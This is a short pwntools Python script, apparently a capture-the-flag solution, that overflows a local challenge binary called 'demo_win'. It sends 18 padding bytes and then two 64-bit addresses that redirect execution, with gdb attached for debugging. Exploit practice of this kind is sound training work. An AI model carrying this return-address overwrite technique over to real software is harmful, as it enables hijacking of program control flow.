from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/1-demo-win/demo_win")
pwn.gdb.attach(p)
p.recvuntil(b"Let's do it!")
payload = b"\x00" * 18
payload += p64(0x40044e) + p64(0x4005af)
payload += b"\n"
p.send(payload)
p.interactive()
